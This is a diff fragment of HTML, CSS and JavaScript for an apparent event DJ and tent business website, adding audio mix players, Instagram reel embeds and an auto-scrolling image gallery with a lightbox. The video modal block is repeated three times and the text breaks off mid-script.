+        <div class="option-btn" onclick="openHubModal('audioModal')">
+            <i class="fas fa-music"></i> LISTEN TO AUDIO
+        </div>
+        
+        <div class="option-btn" onclick="openHubModal('videoModal')">
+            <i class="fab fa-instagram"></i> WATCH REELS
+        </div>
+    </div>
+</div>
+
+<div class="media-modal" id="audioModal">
+    <i class="fas fa-times close-modal-btn" onclick="closeAllModals()"></i>
+    
+    <div class="gallery-container">
+        <h2 class="gallery-title"><i class="fas fa-compact-disc"></i> EXCLUSIVE MIXES</h2>
+        
+        <div class="audio-card">
+            <h4><i class="fas fa-play-circle" style="color:#D4AF37;"></i> Premium DJ Mix 1</h4>
+            <audio controls preload="none"><source src="https://files.catbox.moe/m832cb.mp3" type="audio/mpeg"></audio>
+        </div>
+
+        <div class="audio-card">
+            <h4><i class="fas fa-play-circle" style="color:#D4AF37;"></i> Heavy Bass Drop</h4>
+            <audio controls preload="none"><source src="https://files.catbox.moe/efdl27.mp3" type="audio/mpeg"></audio>
+        </div>
+
+        <div class="audio-card">
+            <h4><i class="fas fa-play-circle" style="color:#D4AF37;"></i> Grand Wedding Entrance</h4>
+            <audio controls preload="none"><source src="https://files.catbox.moe/mus2yv.mp3" type="audio/mpeg"></audio>
+        </div>
+        
+        <button class="option-btn" style="width:100%; margin-top:10px; padding:15px;" onclick="openHubModal('selectionModal')">
+            <i class="fas fa-arrow-left"></i> BACK
+        </button>
+    </div>
+</div>
+
+<div class="media-modal" id="videoModal">
+    <i class="fas fa-times close-modal-btn" onclick="closeAllModals()"></i>
+    
+    <div class="gallery-container" style="padding: 10px;"> 
+        <h2 class="gallery-title"><i class="fab fa-instagram"></i> INSTAGRAM REELS</h2>
+        
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DT-a_KEk7Dg/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DT1WY8SCOgw/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU97ieVE7nR/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU85vD-E25K/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU846FikxCk/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU837C8kxNF/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DUDeT9siJfO/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT5paKBE03U/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT5X-Z-k-ai/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT4HlNrE9xN/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT1lb02iGy0/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT1fBhtCA4X/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DTz9nEPkyKO/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTz79cyE7Hh/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTzJWMNExQh/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTy-LYlCNSm/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTwaxZ2kel6/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTu4AZdE2sr/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTv-Kt5kyN8/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+
+        <button class="option-btn" style="width:90%; margin:20px auto; padding:15px;" onclick="openHubModal('selectionModal')">
+            <i class="fas fa-arrow-left"></i> BACK
+        </button>
+    </div>
+</div>
+
+<script async src="//www.instagram.com/embed.js"></script>
+
+<script>
+    function openHubModal(modalId) {
+        // Close all modals first
+        document.querySelectorAll('.media-modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+        
+        // Open the selected modal
+        document.getElementById(modalId).classList.add('active');
+        
+        // --- THE FIX ---
+        // If opening the video modal, wait 300 milliseconds for the window to 
+        // physically open on the screen BEFORE telling Instagram to load the videos.
+        // This prevents the flat lines!
+        if(modalId === 'videoModal') {
+            setTimeout(() => {
+                if(window.instgrm) {
+                    window.instgrm.Embeds.process();
+                }
+            }, 300);
+        }
+    }
+
+    function closeAllModals() {
+        document.querySelectorAll('.media-modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+        
+        // Stop audio from playing when modal closes
+        document.querySelectorAll('audio').forEach(audio => {
+            audio.pause();
+            audio.currentTime = 0;
+        });
+    }
+</script>
+<div class="media-modal" id="videoModal">
+    <i class="fas fa-times close-modal-btn" onclick="closeAllModals()"></i>
+    
+    <div class="gallery-container" style="padding: 0;"> 
+        <h2 class="gallery-title"><i class="fab fa-instagram"></i> INSTAGRAM REELS</h2>
+        
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DT-a_KEk7Dg/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DT1WY8SCOgw/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU97ieVE7nR/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU85vD-E25K/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU846FikxCk/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU837C8kxNF/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DUDeT9siJfO/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT5paKBE03U/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT5X-Z-k-ai/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT4HlNrE9xN/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT1lb02iGy0/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT1fBhtCA4X/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DTz9nEPkyKO/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTz79cyE7Hh/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTzJWMNExQh/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTy-LYlCNSm/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTwaxZ2kel6/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTu4AZdE2sr/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTv-Kt5kyN8/" data-instgrm-version="14" style="background:#000; border:0; margin: 0; width:100%;"><div style="padding:16px; text-align:center; color:#fff;">Loading Reel...</div></blockquote></div>
+
+        <button class="option-btn" style="width:90%; margin:20px auto; padding:15px;" onclick="openHubModal('selectionModal')">
+            <i class="fas fa-arrow-left"></i> BACK
+        </button>
+    </div>
+</div>
+
+<script async src="//www.instagram.com/embed.js"></script>
+
+<script>
+    function openHubModal(modalId) {
+        document.querySelectorAll('.media-modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+        
+        document.getElementById(modalId).classList.add('active');
+        
+        // This forces Instagram to load the 19 videos ONLY when the gallery is opened
+        if(modalId === 'videoModal' && window.instgrm) {
+            window.instgrm.Embeds.process();
+        }
+    }
+
+    function closeAllModals() {
+        document.querySelectorAll('.media-modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+        
+        // Stop audio from playing when modal closes
+        document.querySelectorAll('audio').forEach(audio => {
+            audio.pause();
+            audio.currentTime = 0;
+        });
+    }
+</script>
+<div class="media-modal" id="videoModal">
+    <i class="fas fa-times close-modal-btn" onclick="closeAllModals()"></i>
+    
+    <div class="gallery-container" style="padding: 10px;"> 
+        <h2 class="gallery-title"><i class="fab fa-instagram"></i> INSTAGRAM REELS</h2>
+        
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DT-a_KEk7Dg/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DT1WY8SCOgw/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU97ieVE7nR/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU85vD-E25K/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU846FikxCk/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DU837C8kxNF/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DUDeT9siJfO/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT5paKBE03U/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT5X-Z-k-ai/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT4HlNrE9xN/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT1lb02iGy0/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DT1fBhtCA4X/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/p/DTz9nEPkyKO/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTz79cyE7Hh/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTzJWMNExQh/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTy-LYlCNSm/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTwaxZ2kel6/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTu4AZdE2sr/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+        <div class="video-card"><blockquote class="instagram-media" data-instgrm-permalink="https://www.instagram.com/reel/DTv-Kt5kyN8/" data-instgrm-version="14" style="background:#FFF; border:0; margin:1px; max-width:540px; min-width:326px; padding:0; width:100%;"></blockquote></div>
+
+        <button class="option-btn" style="width:90%; margin:20px auto; padding:15px;" onclick="openHubModal('selectionModal')">
+            <i class="fas fa-arrow-left"></i> BACK
+        </button>
+    </div>
+</div>
+
+<script async src="//www.instagram.com/embed.js"></script>
+
+<script>
+    function openHubModal(modalId) {
+        // Close all modals first
+        document.querySelectorAll('.media-modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+        
+        // Open the selected modal
+        document.getElementById(modalId).classList.add('active');
+        
+        // --- THE FIX ---
+        // If opening the video modal, wait 300 milliseconds for the window to 
+        // physically open on the screen BEFORE telling Instagram to load the videos.
+        // This prevents the flat lines!
+        if(modalId === 'videoModal') {
+            setTimeout(() => {
+                if(window.instgrm) {
+                    window.instgrm.Embeds.process();
+                }
+            }, 300);
+        }
+    }
+
+    function closeAllModals() {
+        document.querySelectorAll('.media-modal').forEach(modal => {
+            modal.classList.remove('active');
+        });
+        
+        // Stop audio from playing when modal closes
+        document.querySelectorAll('audio').forEach(audio => {
+            audio.pause();
+            audio.currentTime = 0;
+        });
+    }
+</script>
+
+            <div class="section-label"><i class="fas fa-images"></i> OUR SETUP & SHOWCASE</div>
+            <div class="grid">
+                <a href="#" class="img-card" onclick="navAction('booking')"><img src="https://i.postimg.cc/5yRdctZh/1771529133710.jpg" alt="DJ Setup"><span>Elite DJ Setup</span></a>
+                <a href="#" class="img-card" onclick="navAction('booking')"><img src="https://i.postimg.cc/R0smYWFp/2025-10-07-(5).jpg" alt="Tent House"><span>Premium Tents</span></a>
+                <a href="#" class="img-card" onclick="navAction('booking')"><img src="https://i.postimg.cc/hPgQLpyz/image_b73be3f2_1.png" alt="Premium Quality"><span>Premium Lightings</span></a>
+                <a href="#" class="img-card" onclick="navAction('booking')"><img src="https://i.postimg.cc/Vv7kBKCH/2025-10-07-(1).jpg" alt="Booking"><span>Premium Quality</span></a>
+            </div>
+            <style>
+    /* --- IMPORT ADVANCED LUXURY FONTS --- */
+    @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@700;900&family=Outfit:wght@300;400;600&display=swap');
+
+    /* --- 1. GALLERY HEADING --- */
+    #gallery {
+        text-align: center;
+        margin: 40px 0 20px 0;
+        font-family: 'Cinzel', serif;
+        scroll-margin-top: 80px;
+    }
+    
+    .gallery-title {
+        font-size: 24px;
+        font-weight: 800;
+        color: var(--text-main);
+        letter-spacing: 2px;
+        margin: 0 0 5px 0;
+        text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+    }
+    
+    .gallery-title i {
+        color: var(--gold-primary);
+        margin-right: 8px;
+    }
+
+    .gallery-subtitle {
+        font-family: 'Outfit', sans-serif;
+        color: var(--gold-primary);
+        font-size: 13px;
+        font-weight: 600;
+        letter-spacing: 3px;
+        text-transform: uppercase;
+        margin: 0;
+    }
+
+    /* --- 2. THE SMART AUTO-SLIDER TRACK (Left-to-Right) --- */
+    .smart-slider-container {
+        position: relative;
+        width: 100vw;
+        margin-left: calc(-50vw + 50%); /* Forcing edge-to-edge full width */
+        background-color: var(--bg-body);
+        padding: 20px 0;
+        border-top: 1px solid var(--border-color);
+        border-bottom: 1px solid var(--border-color);
+    }
+
+    /* Cinematic Dark Fade Edges */
+    .smart-slider-container::before,
+    .smart-slider-container::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        width: 50px;
+        height: 100%;
+        z-index: 5;
+        pointer-events: none;
+    }
+    .smart-slider-container::before { left: 0; background: linear-gradient(to right, var(--bg-body) 0%, transparent 100%); }
+    .smart-slider-container::after { right: 0; background: linear-gradient(to left, var(--bg-body) 0%, transparent 100%); }
+
+    /* The Scrollable Track */
+    .smart-track {
+        display: flex;
+        gap: 15px;
+        padding: 0 15px;
+        overflow-x: auto;
+        scroll-behavior: auto;
+        /* Hide scrollbars for a clean look */
+        scrollbar-width: none; 
+        -ms-overflow-style: none;
+        -webkit-overflow-scrolling: touch; /* Smooth native mobile scrolling */
+    }
+    .smart-track::-webkit-scrollbar { display: none; }
+
+    /* The Images */
+    .smart-img {
+        flex: 0 0 auto;
+        width: 250px;
+        height: 250px;
+        object-fit: cover;
+        border-radius: 16px;
+        border: 1px solid var(--border-color);
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.8);
+        cursor: pointer;
+        transition: transform 0.3s ease, border-color 0.3s ease;
+    }
+
+    .smart-img:active {
+        transform: scale(0.95);
+        border-color: var(--gold-primary);
+    }
+
+    /* --- 3. THE PREMIUM EXPAND VIEW LIGHTBOX (MODAL) --- */
+    .mnd-lightbox {
+        position: fixed;
+        inset: 0;
+        background: rgba(0, 0, 0, 0.95);
+        backdrop-filter: blur(15px);
+        -webkit-backdrop-filter: blur(15px);
+        z-index: 99999;
+        display: none; /* Hidden by default */
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        opacity: 0;
+        transition: opacity 0.4s ease;
+    }
+
+    .mnd-lightbox.active {
+        display: flex;
+        opacity: 1;
+    }
+
+    .lb-close-btn {
+        position: absolute;
+        top: 25px;
+        right: 25px;
+        color: var(--gold-primary);
+        font-size: 35px;
+        cursor: pointer;
+        z-index: 100000;
+        text-shadow: 0 0 15px rgba(212, 175, 55, 0.5);
+    }
+
+    /* Full Image, Half Window height, Preserving aspect ratio */
+    .lb-image {
+        max-width: 90%;
+        max-height: 55vh; /* Constraints height to ~55% of the viewport */
+        border-radius: 20px;
+        border: 2px solid var(--gold-primary);
+        box-shadow: 0 15px 50px rgba(212, 175, 55, 0.2);
+        object-fit: contain; /* Shows full uncropped image */
+        animation: zoomIn 0.4s cubic-bezier(0.25, 1, 0.5, 1);
+    }
+
+    @keyframes zoomIn {
+        from { transform: scale(0.8); opacity: 0; }
+        to { transform: scale(1); opacity: 1; }
+    }
+
+    .lb-text-container {
+        margin-top: 25px;
+        text-align: center;
+        padding: 0 20px;
+        max-width: 400px;
+    }
+
+    .lb-title {
+        font-family: 'Cinzel', serif;
+        color: var(--gold-primary);
+        font-size: 26px;
+        font-weight: 800;
+        margin: 0 0 8px 0;
+        letter-spacing: 1px;
+    }
+
+    .lb-desc {
+        font-family: 'Outfit', sans-serif;
+        color: var(--text-sub);
+        font-size: 14px;
+        line-height: 1.6;
+        margin: 0;
+        font-weight: 300;
+    }
+</style>
+
+<div id="gallery">
+    <h2 class="gallery-title"><i class="fas fa-gem"></i> ELITE SHOWCASE</h2>
+    <p class="gallery-subtitle">Tap Any Image To Expand</p>
+</div>
+
+<div class="smart-slider-container">
+    <div class="smart-track" id="autoScrollTrack">
+        
+        <img src="https://i.postimg.cc/R0smYWFp/2025-10-07-(5).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Pf8H6rkd/2025-10-10-(1).png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Mp9mfwHd/2025-10-09.jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/5N3wDJB1/2025-10-10.png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/g0RrFyC3/2025-10-07.jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/3JHsnX1r/2025-10-07-(6).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/3xxbcnv3/2025-10-07-(10).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Vv7kBKCH/2025-10-07-(1).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/W38NT5X0/2025-10-07-(2).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/N0VVTmFm/2025-10-07-(8).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/pXpWMY8f/2025-10-07.png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/9XySR4hN/2025-10-07-(9).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/kMhCs6ZG/2025-10-07-(3).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Pr8gM6Yz/2025-10-07-(4).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/FFfr2V0k/2025-10-07-(1).png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/k5k1DChn/2025-10-07-(2).png" class="smart-img" onclick="openLightbox(this.src)">
+
+        <img src="https://i.postimg.cc/R0smYWFp/2025-10-07-(5).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Pf8H6rkd/2025-10-10-(1).png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Mp9mfwHd/2025-10-09.jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/5N3wDJB1/2025-10-10.png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/g0RrFyC3/2025-10-07.jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/3JHsnX1r/2025-10-07-(6).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/3xxbcnv3/2025-10-07-(10).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Vv7kBKCH/2025-10-07-(1).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/W38NT5X0/2025-10-07-(2).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/N0VVTmFm/2025-10-07-(8).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/pXpWMY8f/2025-10-07.png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/9XySR4hN/2025-10-07-(9).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/kMhCs6ZG/2025-10-07-(3).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/Pr8gM6Yz/2025-10-07-(4).jpg" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/FFfr2V0k/2025-10-07-(1).png" class="smart-img" onclick="openLightbox(this.src)">
+        <img src="https://i.postimg.cc/k5k1DChn/2025-10-07-(2).png" class="smart-img" onclick="openLightbox(this.src)">
+
+    </div>
+</div>
+
+<div class="mnd-lightbox" id="mndLightbox">
+    <i class="fas fa-times lb-close-btn" onclick="closeLightbox()"></i>
+    
+    <img src="" id="lightboxImg" class="lb-image" alt="Full Screen Event View">
+    
+    <div class="lb-text-container">
+        <h3 class="lb-title">MAA NIRMALA EXCLUSIVE</h3>
+        <p class="lb-desc">A perfect perspective on our signature event setups. From grand lighting to flawless stage designs, every detail is captured in full clarity.</p>
+    </div>
+</div>
+
+<script>
+    // --- 1. Smart Auto/Manual Scrolling Logic ---
+    const track = document.getElementById('autoScrollTrack');
+    let isAutoScrolling = true;
+    let scrollSpeed = 1; // Speed of the auto-slide
+    let resumeTimeout;
+
+    // Start auto-scrolling
+    function autoSlide() {
+        if (isAutoScrolling) {
+            track.scrollLeft += scrollSpeed;
+            // Loop silently halfway through duplicated images
